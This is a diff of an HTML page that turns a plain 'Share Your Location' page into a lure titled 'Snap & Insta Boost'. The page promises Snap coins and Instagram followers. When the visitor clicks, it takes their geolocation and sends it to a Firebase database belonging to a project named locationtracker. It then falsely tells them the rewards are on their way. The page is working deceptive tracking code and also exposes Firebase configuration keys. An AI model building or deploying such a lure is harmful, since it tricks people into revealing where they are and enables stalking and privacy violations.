@@ -1,56 +1,103 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Share Location</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Snap & Insta Boost</title>
+<style>
+  body {
+    background-color: #1877f2;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 50px;
+  }
+  button {
+    background-color: #fff;
+    color: #1877f2;
+    border: none;
+    padding: 15px 30px;
+    font-size: 18px;
+    border-radius: 8px;
+    cursor: pointer;
+  }
+  button:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+  }
+  #status {
+    margin-top: 20px;
+    font-size: 16px;
+    min-height: 20px;
+  }
+</style>
 </head>
 <body>
-  <h1>Share Your Location</h1>
-  <button onclick="shareLocation()">Share My Location</button>
-  <p id="status"></p>
 
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBa0AVYjgYb-UBAYlbyEphqqrMSBq6Sb9c",
-      authDomain: "locationtracker-3df88.firebaseapp.com",
-      projectId: "locationtracker-3df88",
-      storageBucket: "locationtracker-3df88.firebasestorage.app",
-      messagingSenderId: "581996704565",
-      appId: "1:581996704565:web:821e744807609771ec927c",
-      measurementId: "G-Q6H68F1V4W"
-    };
+<h1>Snap & Insta Boost</h1>
+<button id="boostBtn">Add Snap Coins & Instagram Followers</button>
+<p id="status"></p>
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
-    function shareLocation() {
-      const status = document.getElementById('status');
-      if (!navigator.geolocation) {
-        status.innerText = "Geolocation is not supported by your browser.";
-        return;
-      }
+<script>
+  // Your Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyBa0AVYjgYb-UBAYlbyEphqqrMSBq6Sb9c",
+    authDomain: "locationtracker-3df88.firebaseapp.com",
+    databaseURL: "https://locationtracker-3df88-default-rtdb.firebaseio.com",
+    projectId: "locationtracker-3df88",
+    storageBucket: "locationtracker-3df88.appspot.com",
+    messagingSenderId: "581996704565",
+    appId: "1:581996704565:web:821e744807609771ec927c",
+    measurementId: "G-Q6H68F1V4W"
+  };
 
-      status.innerText = "Getting location...";
-      navigator.geolocation.getCurrentPosition((position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-        db.collection("locations").add({
-          latitude: lat,
-          longitude: lon,
-          timestamp: firebase.firestore.FieldValue.serverTimestamp()
-        }).then(() => {
-          status.innerText = "Location shared successfully!";
-        }).catch((error) => {
-          status.innerText = "Error sharing location: " + error.message;
-        });
+  const button = document.getElementById('boostBtn');
+  const status = document.getElementById('status');
 
-      }, (error) => {
-        status.innerText = "Error getting location: " + error.message;
-      });
+  button.onclick = () => {
+    if (!navigator.geolocation) {
+      status.textContent = 'Geolocation is not supported by your browser.';
+      return;
     }
-  </script>
+
+    button.disabled = true;
+    status.textContent = 'Getting your location...';
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const { latitude, longitude } = position.coords;
+        status.textContent = 'Saving your request...';
+
+        const offersRef = db.ref('offers').push();
+        offersRef.set({
+          lat: latitude,
+          lng: longitude,
+          time: Date.now()
+        })
+        .then(() => {
+          status.textContent = 'Success! Your Snap coins and followers are on their way!';
+          button.disabled = false;
+        })
+        .catch((error) => {
+          status.textContent = 'Error saving data: ' + error.message;
+          button.disabled = false;
+        });
+      },
+      (error) => {
+        status.textContent = 'Error getting location: ' + error.message;
+        button.disabled = false;
+      }
+    );
+  };
+</script>
+
 </body>
 </html>
